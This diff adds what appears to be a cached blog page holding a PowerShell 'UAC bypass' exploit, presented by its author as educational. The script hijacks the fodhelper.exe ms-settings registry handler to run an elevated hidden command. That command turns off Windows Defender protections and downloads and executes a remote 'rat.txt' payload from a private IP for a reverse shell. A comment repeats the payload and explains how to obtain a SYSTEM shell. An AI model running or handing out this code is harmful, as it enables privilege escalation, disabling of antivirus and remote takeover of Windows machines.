@@ -1,0 +1,32 @@
+I"U<p>All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!</p>
+
+<p>###UAC BYPASS SCRIPT</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">alt</span><span class="w"> </span><span class="p">{</span><span class="w"> 
+    </span><span class="kr">Param</span><span class="w"> </span><span class="p">(</span><span class="w">    
+        </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$program</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;iex (new-object net.webclient).downloadstring(''http://192.168.49.118/rat.txt'')'</span><span class="w">
+        
+        </span><span class="c">#Disables win defender and calls powershell payload for additional reverse shell w/ elevation.  Note that type of payload matters! Calling a remote injector/hollower w/ ppid spoof will give you a system shell, if you want a normal one call a standard runner.</span><span class="w">
+        </span><span class="c">#Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;iex (new-object net.webclient).downloadstring(''http://192.168.1.195/rat.txt'')</span><span class="w">
+        
+        
+         
+    </span><span class="p">)</span><span class="w">
+    
+    
+    </span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\ms-settings\CurVer"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+    </span><span class="n">Set-ItemProperty</span><span class="w">  </span><span class="s2">"HKCU:\Software\Classes\ms-settings\CurVer"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"(default)"</span><span class="w"> </span><span class="nt">-value</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+
+    </span><span class="n">New-Item</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\.yelow\Shell\Open\command"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+    </span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\.yelow\Shell\Open\command"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"(default)"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$program</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+
+    </span><span class="n">Set-ItemProperty</span><span class="w">  </span><span class="s2">"HKCU:\Software\Classes\ms-settings\CurVer"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"(default)"</span><span class="w"> </span><span class="nt">-value</span><span class="w"> </span><span class="s2">".yelow"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+    </span><span class="n">Start-Process</span><span class="w"> </span><span class="s2">"C:\Windows\System32\fodhelper.exe"</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">Hidden</span><span class="w">
+
+    </span><span class="n">Start-Sleep</span><span class="w"> </span><span class="nx">3</span><span class="w">
+    
+    </span><span class="n">Remove-Item</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\ms-settings\"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+    </span><span class="n">Remove-Item</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\.yelow\"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+:ET
